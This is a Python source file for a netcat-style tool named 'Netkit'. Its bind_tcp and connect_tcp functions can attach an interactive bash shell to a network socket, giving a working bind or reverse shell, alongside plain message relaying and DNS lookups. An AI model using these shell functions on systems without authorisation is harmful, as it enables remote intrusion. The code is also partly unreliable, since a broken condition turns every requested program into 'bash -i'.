import socket, threading, sys, os, subprocess


def error():
	global tm
	try:
		s.close()
	except:
		conn.close()
	tm = False
	sys.exit()
	try: raise
	finally: sys.exit()
def msg():
	try:
		while tm:
			msg = input()
			msg = msg+'\n'
			msg = msg.encode('utf-8')
			conn.send(msg)
	except BrokenPipeError:
		print('Netkit: Broken pipe')
		error()
	except:
		error()


def t():
	try:
		t = threading.Thread(target=msg, args=())
		t.start()
	except: error()
def msg1():
	while tm:
		try:
			m = conn.recv(2048).decode('utf-8')
			if len(m) >= 1:print(m[0:-1])
		except:
			error()

def bind_tcp(host, port, exe=False, max=max):
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.bind((host, port))
	except socket.error as e:
		if str(e) == '[Errno 13] Permission denied':
			print('Netkit: Permission Denied')

		elif str(e) == '[Errno 98] Address already in use':
		    print("Netkit: Address already in use")
		sys.exit()
	except KeyboardInterrupt:
		sys.exit()
	s.listen(max)
	print(f'Netkit: Listen {host}:{port}')
	if max != 1:
		print(f'Netkit: Maximum connections set is {max}')
	global conn
	try: conn, addr = s.accept()
	except KeyboardInterrupt: sys.exit()
	print(f'Netkit: Connection from {addr[0]}:{addr[1]}')
	global tm;tm = True
	if exe != False:
		os.dup2(conn.fileno(), 0)
		os.dup2(conn.fileno(), 1)
		os.dup2(conn.fileno(), 2)
		if exe == '/bin/bash' or 'bash':  exe = 'bash -i'
		subprocess.call(exe, shell=True)
	else:
		t()
		msg1()

def connect_tcp(host, port, exe=False):
	global conn
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		conn.settimeout(15)
		conn.connect((host, port))
	except socket.timeout:
		print('Netkit: Timeout')
		conn.close()
	global tm;tm = True
	print(f'Netkit: Connected to {socket.gethostbyname(host)}:{port}')
	if exe != False:
		os.dup2(conn.fileno(), 0)
		os.dup2(conn.fileno(), 1)
		os.dup2(conn.fileno(), 2)
		if exe == '/bin/bash' or 'bash':  exe = 'bash -i'
		subprocess.call(exe, shell=True)
	else:
		t()
		msg1()

def dns_resolver(domain):
	try:
		print(socket.gethostbyname(domain))
	except socket.gaierror:
		print('Netkit: Domain invalid')
def dns_reverse_resolver(address):
	try:
		print(socket.gethostbyaddr(address)[0])
	except socket.gaierror:
		print('Netkit: Address invalid')

